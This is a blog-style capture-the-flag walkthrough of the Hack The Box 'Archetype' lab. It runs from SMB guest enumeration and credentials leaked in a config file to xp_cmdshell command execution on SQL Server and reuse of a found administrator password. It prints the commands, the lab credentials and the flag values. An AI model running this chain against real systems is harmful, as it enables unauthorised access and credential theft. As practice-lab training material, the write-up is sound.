---
slug: hack-the-box-archetype-challenge
title: Hack The Box ‘Archetype’ Challenge
description: Fill me up!
authors: [kbbgl]
tags: [capture_the_flag,ctf,cybersecurity,hacking,smb,windows]
---

## What is Hack The Box?

[Hack The Box](https://www.hackthebox.eu/) is a website offering vulnerable machines for practising hacking skills. The goal of the ‘Labs’ are to hack into the system and capture the flag (CTF) which can be found in a text file in the desktop of a regular and an administrator user.
On my pursuit to get some practical exercise in the field, I decided to sign up and attempt one of the beginner exercises. This post describes how I managed to get remote code execution (RCE) in the one of the boxes and access the flags.

<!-- truncate -->

## Connecting to Hack The Box Network

The first step is to connect to the Hack The Box network to be able to enumerate the target machine. To do this, we need to download an OpenVPN configuration file (`.ovpn`) and use the `openvpn` utility to create the tunnel into the Hack The Box network:

```bash
sudo openvpn /path/to/hack_the_box.ovpn
 
Attempting to establish TCP connection with [AF_INET]1.222.333.222:443 [nonblock]
TCP connection established with [AF_INET]1.222.333.222:443
```

## Enumeration

To enumerate a target machine (IP `10.12.12.27`) is to list all possible ways we can use to hack into it. The best place to start is to scan the machine for open ports and try to detect the operating system so we can tailor our methods. To perform the scan, I used the standard way, [`nmap`, the network mapper](https://nmap.org/).
I executed the scan as follows as I found it gives a pretty verbose output and the scan is quite fast as well:

```bash
ip="10.12.12.27"
nmap -T4 -A $ip -oN nmap_scan.txt
```

The `-A` flag is to used to detect the operating system and version and `traceroute`.
The `-T4` flag is there to ensure that the scan is fast. The range is between `0-5` where the higher the number, the faster it scans.
The `-oN` flag tells the tool to save the scan to a file, in this case `nmap_scan.txt` in the same directory.
Reviewing the scan output, we see that that the machine is a 2019 Windows Server  and has a SQL Server 2017 instance listening on port 1433:

```bash
cat nmap_scan.txt
 
...
PORT     STATE SERVICE      VERSION                                                                                                    
135/tcp  open  msrpc        Microsoft Windows RPC                                                                                      
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn                                                                              
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds                                                            
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
... 
```

If we scroll down a bit more, we can see that the target machine discovery was done using the [SMB (Server Message Block)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831795(v=ws.11)) running on port 445 which is a protocol for shared files and folders in a network:

```bash
cat nmap_scan.txt
 
...
Host script results:                                               
...                       
| smb-security-mode:                                               
|   account_used: guest                                            
|   authentication_level: user                                     
|   challenge_response: supported                                  
|_  message_signing: disabled (dangerous, but default)
```

This is the protocol that allows us to access remote shared network drives from Windows Explorer by inserting `\\REMOTE_IP\SHARE_NAME` in the address bar. SMB is known to have many vulnerabilities (e.g. [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue), [ADV200005](https://msrc.microsoft.com/update-guide/vulnerability/ADV200005)) so my intuition guided me to use this protocol to gain more information about the system. Also, we can see pretty clearly that the guest user is enabled which inherently means that there’s no need for a password!

## Getting Credentials using `smbclient`

Now that we know that the SMB server is up, we need to find a way to connect and enumerate it. I found this [UNIX StackExchange post](https://unix.stackexchange.com/questions/65106/accessing-a-smb-share-without-a-password) helpful as it mentioned that we can connect to the SMB server using a client called smbclient and it provided the arguments needed to connect without a password.
I found that I already had `smbclient` installed:

```bash
which smbclient
/usr/bin/smbclient
```

I attempted to connect to the SMB server using the following command:

```bash
smbclient //$ip// -U " "%" "
```

But I saw no output. It could be a positive since it means that I reached the server and no connection errors were thrown. But it seems that I was missing something to get it to display its contents.
I turned to reading the smbclient manual and found that there’s a way to list the server contents:

```bash
man smbclient
...
-L|--list                                                                                                                       
           This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear.
...
```

Sounds promising. When I ran it, I got the following output:

```bash
smbclient -L //$ip// -U " "%" "
                                                                                                                                       
        Sharename       Type      Comment                                                                                              
        ---------       ----      -------                                                                                              
        ADMIN$          Disk      Remote Admin                                                                                         
        backups         Disk                                                                                                           
        C$              Disk      Default share                                                                                        
        IPC$            IPC       Remote IPC                                                                                           
SMB1 disabled -- no workgroup available
```

So we can see that we have 4 shared drives here, 3 of them are disks and one of them is used for [Inter Process Communications (IPC)](https://en.wikipedia.org/wiki/Inter-process_communication). The IPC enables users to enumerate network shares and is created by default by the system ([source](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)). So I needed to focus on trying to access the disk shares as the IPC is the share that allows us to perform the enumeration in the first place. The $ suffix in the share name indicates it’s the share is hidden.
To access the share, I removed the `-L` flag and ran the following command to attempt to access the `ADMIN` share:

```bash
smbclient //$ip//ADMIN$ -U " "%" "
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Same for the `C$` share (which is the `C` drive):

```bash
smbclient //$ip//C$ -U " "%" "
tree connect failed: NT_STATUS_ACCESS_DENIED
```

This indicates that the guest user doesn’t have access to these shares. But, we attempting to access the backups share, we were introduced with a shell!

```bash
smbclient //$ip\\backups -U " "%" "                                                                                             
Try "help" to get a list of possible commands.                                                                                         
smb: \>  
```

I typed ‘help’ in the command prompt and found that the majority of the commands were pretty standard shell commands. For instance, I wanted to list the contents of the folder:

```bash
smb: \> dir
  .                                   D        0  Mon Jan 20 14:20:57 2020                                                             
  ..                                  D        0  Mon Jan 20 14:20:57 2020                                                             
  prod.dtsConfig                     AR      609  Mon Jan 20 14:23:02 2020                                                             
                                                                                                                                        
                10328063 blocks of size 4096. 8253724 blocks available 
```

I found that there’s some type of configuration file named ‘prod.dtsConfig‘ there. To read its contents, I used the following command:

```bash
smb: \> more prod.dtsConfig
```

```markup
<DTSConfiguration>                                                                                                                     
    <DTSConfigurationHeading>                                                                                                          
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.201
9 10:01:34"/>                                                                                                                          
    </DTSConfigurationHeading>                                                                                                         
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String"> 
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Pers
ist Security Info=True;Auto Translate=False;</ConfiguredValue>                                                                         
    </Configuration>                                                                                                                   
</DTSConfiguration>
```

Looks like we got some valuable information in this XML file. We can see in the `ConfiguredData` node that we have credentials which seem to belong to the SQL Server service:

```markup
<ConfiguredValue>...;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;...</ConfiguredValue>
```

We know from the initial scan that there’s an SQL Server running on the machine and we now have credentials to access it.

## Connecting to SQL Server

In order to start working on SQL Server, I needed a client to connect to it and execute some commands there.
I found [`dbcli/mssql-cli`](https://github.com/dbcli/mssql-cli). I installed it using the `pip` Python package manager and then attempted connecting to the MSSQL service using the credentials we found earlier:

```bash
pip3 install mssql-cli

mssql-cli -S $ip -U $username -P $password
Error message: Login failed for user 'ARCHETYPE/sql_svc'.
```

To get some more information about the login failure, I needed to look at the logic within the `mssqlcli` main module. I found it by searching the filesystem:

```bash
sudo find / -wholename "*mssqlcli/main.py" 2&> /dev/null
~/.local/lib/python3.8/site-packages/mssqlcli/main.py
```

I managed to find a way to increase the verbosity so I have more information about the source of the error by using the `--enable-sqltoolsservice-logging` command line option. This revealed a `NullReference` exception thrown from some C# logger class (which is likely a red-haring) and another exception coming from MSSQL connection service:

```bash
mssql-cli -S $ip -U $username -P $password --enable-sqltoolsservice-logging
 
Unhandled Exception: System.NullReferenceException: Object reference not set to an instance of an object.
   at Microsoft.SqlTools.Utility.Logger.Close() in D:\a\1\s\src\Microsoft.SqlTools.Hosting\Utility\Logger.cs:line 79
   at Microsoft.SqlTools.ServiceLayer.Program.Main(String[] args) in D:\a\1\s\src\Microsoft.SqlTools.ServiceLayer\Program.cs:line 27
Traceback (most recent call last):
  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/request.py", line 51, in get_response
    response = self.json_rpc_client.get_response(self.request_id, self.owner_uri)
  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py", line 84, in get_response
    raise self.exception_queue.get()
  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py", line 124, in _listen_for_response
    response = self.reader.read_response()
  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py", line 272, in read_response
    while (not self.needs_more_data or self.read_next_chunk()):
  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py", line 326, in read_next_chunk
    raise EOFError(u'End of stream reached, no output.')
EOFError: End of stream reached, no output.
 
During handling of the above exception, another exception occurred:
 
Traceback (most recent call last):
  File "/usr/lib/python3.8/runpy.py", line 194, in _run_module_as_main
    return _run_code(code, main_globals, None,
  File "/usr/lib/python3.8/runpy.py", line 87, in _run_code
    exec(code, run_globals)
  File "~/.local/lib/python3.8/site-packages/mssqlcli/main.py", line 122, in <module>
    main()
  File "~/.local/lib/python3.8/site-packages/mssqlcli/main.py", line 115, in main
    run_cli_with(mssqlcli_options)
  File "~/.local/lib/python3.8/site-packages/mssqlcli/main.py", line 52, in run_cli_with
    mssqlcli.connect_to_database()
  File "~/.local/lib/python3.8/site-packages/mssqlcli/mssql_cli.py", line 278, in connect_to_database
    owner_uri, error_messages = self.mssqlcliclient_main.connect_to_database()
  File "~/.local/lib/python3.8/site-packages/mssqlcli/mssqlcliclient.py", line 91, in connect_to_database
    owner_uri, error_messages = self._execute_connection_request_with(connection_params)
  File "~/.local/lib/python3.8/site-packages/mssqlcli/mssqlcliclient.py", line 180, in _execute_connection_request_with
    response = connection_request.get_response()
  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/request.py", line 67, in get_response
    return self.response_error(error)
  File "~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/connectionservice.py", line 22, in response_error
    u'ownerUri': cls.owner_uri,
AttributeError: type object 'ConnectionRequest' has no attribute 'owner_uri'
```

I decided that I had wasted enough time debugging a third party library when there are so many other out there that do the same operation. After all, I wanted to capture the flag in an efficient as time as possible. Therefore, I decided to try [`impacket`](https://github.com/SecureAuthCorp/impacket).
Installation was done using `pip`:

```bash
pip install impacket
```

And used the documentation to run the following command to connect to SQL Server but I received some unknown error which seemed to originate from switching to TLS:

```bash
mssqlclient.py $username:$password@$ip
Impacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright 2020 SecureAuth Corporation
 
Password:
[*] Encryption required, switching to TLS
[-] [('SSL routines', 'state_machine', 'internal error')]
```

I found that I could get more information by specifying the `-debug` flag which provided the stacktrace:

```bash
mssqlclient.py $username:$password@$ip -debug
Impacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright 2020 SecureAuth Corporation
 
[+] Impacket Library Installation Path: /usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket
Password:
[*] Encryption required, switching to TLS
[+] Exception:
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/EGG-INFO/scripts/mssqlclient.py", line 179, in <module>
    res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket/tds.py", line 917, in login
    tls.do_handshake()
  File "/usr/lib/python3/dist-packages/OpenSSL/SSL.py", line 1915, in do_handshake
    self._raise_ssl_error(self._ssl, result)
  File "/usr/lib/python3/dist-packages/OpenSSL/SSL.py", line 1647, in _raise_ssl_error
    _raise_current_error()
  File "/usr/lib/python3/dist-packages/OpenSSL/_util.py", line 54, in exception_from_error_queue
    raise exception_type(errors)
OpenSSL.SSL.Error: [('SSL routines', 'state_machine', 'internal error')]
[-] [('SSL routines', 'state_machine', 'internal error')]
```

From the stacktrace, the issue is caused by a problem in the SSL handshake pointing to the OpenSSL library.
Doing some research, I found that [this problem](https://github.com/SecureAuthCorp/impacket/issues/856) also happened to other people and someone had found [a solution by modifying the TLS version from v1 to v2](https://github.com/SecureAuthCorp/impacket/issues/856#issuecomment-729880208). I performed the same changes in the `~/.local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket/tds.py` and reran the same command:

```bash
mssqlclient.py $username:$password@$ip -debug
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
[*] Encryption required, switching to TLS
[-] ERROR(ARCHETYPE): Line 1: Login failed for user 'sql_svc'.
```

This time around I got a different error message, a failed login with the user `sql_svc`. I found a way around that by specifying the `-windows-auth` flag which enables using [Kerberos\Windows authentication](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver15#connecting-through-windows-authentication):

```bash
mssqlclient.py $username:$password@$ip -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

I had an SQL shell! But I was lost at this point. I had no idea what to do from here as I have very limited knowledge using SQL Server administration aside from writing queries and creating database resources. I had to take a step back to review and research this.

## Running System Commands from SQL Server Shell

Reading through official Microsoft documentation, I found that we can actually [run system commands from within SQL Server using the `xp_cmdshell`](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15). This is exactly what I was looking for as it enabled me to be able to interact with the remote target system. When I attempted to run this cmdlet, I received the following error:

```bash
SQL> xp_cmdshell "echo test"
 
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

Seems that we need to enable the use of the command somehow. Reading the [Microsoft documentation](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15#remarks) in greater depth, I found that the cmdlet is disabled by default. It also gave me the information I needed in order to enable it:

> `xp_cmdshell` is a very powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the Policy-Based Management or by executing `sp_configure`. For more information, see [Surface Area Configuration](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration?view=sql-server-ver15) and [`xp_cmdshell` Server Configuration Option](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15).

I ran the following command to enable it:

```bash
sp_configure 'xp_cmdshell', 1
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

I then ran `reconfigure` as requested. I was now able to run any commands on the machine.
Since I speak a little bit of Batch, I ran a command to see which directory we’re currently in:

```bash
SQL> xp_cmdshell "echo The current directory is %CD%"
output                                                                             
 
--------------------------------------------------------------------------------   
 
The current directory is C:\Windows\system32                                       
SQL>whoami
output                                                                             
 
--------------------------------------------------------------------------------   
 
archetype\sql_svc 
```

Looks like the user we’re currently logged in with `sql_svc` who can run remote commands on the system. So now all that is left is to read the contents of the user flag in the desktop:

```bash
SQL> xp_cmdshell "type c:\Users\sql_svc\Desktop\user.txt"
output                                                                             
 
--------------------------------------------------------------------------------   
 
3e7b102e78218e935bf3f4951fec21a3
```

I was delighted at this point. But still had my eyes to the second and more challenging part: retrieve the administrator’s flag.
I attempted to access the path where the flag is located but unfortunately I could not access it:

```bash
SQL> xp_cmdshell "cd c:\Users\Administrator\Desktop"
output                                                                             
 
--------------------------------------------------------------------------------   
Access is denied.
```

I decided, since I had access to the C: drive, it was worth to do a recursive search in the drive to see if we can find the word “administrator” in some file (since we know that only the administrator account can access the flag on its desktop):
I spawned a new PowerShell process and ran the following command only to be stopped because of denial to search in a particular path (The Event Viewer logs):

```powershell
SQL>xp_cmdshell "powershell "Get-ChildItem -Recurse | Select-String administrator -List | Select Path""
 
Select-String : The file C:\Windows\system32\winevt\Logs\Windows PowerShell.evtx cannot be read: Access to the path    
 
'C:\Windows\system32\winevt\Logs\Windows PowerShell.evtx' is denied.               
 
At line:1 char:26                                                                  
 
+ Get-ChildItem -Recurse | Select-String administrator -List | Select P ...        
 
+                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       
 
    + CategoryInfo          : InvalidArgument: (:) [Select-String], ArgumentException   
 
    + FullyQualifiedErrorId : ProcessingFile,Microsoft.PowerShell.Commands.SelectStringCommand   
```

I altered the command a bit and added the flag `-ErrorAction SilentlyContinue` to prevent the script from from stopping. Let me break down each part to explain what it’s intended to do.
The first part retrieves all files and directories from the `sql_svc` home folder recursively. [The `-File` flag ensures the cmdlet only returns files. The `-Force` flag is important here because it searches for all files (even hidden ones)](https://superuser.com/questions/150748/have-powershell-get-childitem-return-files-only):

```powershell
Get-ChildItem -Path C:\Users\sql_svc -Recurse -Force -ErrorAction SilentlyContinue -File
```

We then pipe the list of all files and folders into the following command:

```powershell
Get-Content -ErrorAction SilentlyContinue
```

This will read the contents of each file that was piped into the command and print it to the console.
The last part of the command performs a case-insensitive search for the word ‘administrator’ in all the piped content:

```powershell
Select-String administrator -ErrorAction SilentlyContinue
```

Putting it all together and displaying the output, we see that one of the files that was read had a command that included the word ‘administrator’!

```powershell
SQL> xp_cmdshell "powershell "Get-ChildItem -Path C:\Users\sql_svc -Recurse -Force -ErrorAction SilentlyContinue | Get-Content -ErrorAction SilentlyContinue| Select-String administrator -ErrorAction SilentlyContinue""
 
output                                                                             
 
--------------------------------------------------------------------------------   
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!            
```

The command [maps the T drive to the backups share using the administrator account](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)). And we can see that the last argument includes the administrator password!
All that’s left is to either log in with the administrator credentials to SQL Server or find a way to run a command as the administrator and then read the contents of the flag.
The attempt for the former failed:

```bash
mssqlclient.py ARCHETYPE/administrator:MEGACORP_4dm1n\!\!@$ip -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
[*] Encryption required, switching to TLS
[-] ERROR(ARCHETYPE): Line 1: Login failed for user 'ARCHETYPE\administrator'.
```

This is because there’s no such user in the database (logged in with `sql_svc` user):

```sql
SQL> SELECT name FROM sys.database_principals

name
 
public
dbo
guest
INFORMATION_SCHEMA
sys
##MS_PolicyEventProcessingLogin##
##MS_AgentSigningCertificate##
db_owner
db_accessadmin
db_securityadmin 
db_ddladmin
db_backupoperator
db_datareader
db_datawriter
db_denydatareader
db_denydatawriter                               
```

So I needed to try the latter approach: run the command to read the flag as administrator.
I did some research and found [a way to do this using PowerShell](https://superuser.com/a/1421775/506517). I ran the following command to specify the administrator credentials and print the contents of the flag:

```sql
SQL> xp_cmdshell "powershell "$username=\"administrator\";$password=\"MEGACORP_4dm1n!!\";$pass = ConvertTo-SecureString -AsPlainText $Password -Force;$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass;Invoke-Command -ComputerName \"Archetype\" -Credential $Cred -ScriptBlock {Get-Content C:\Users\Administrator\Desktop\root.txt} ""

output                                                                             
 
b91ccec3305e98240082d4474b848528
```
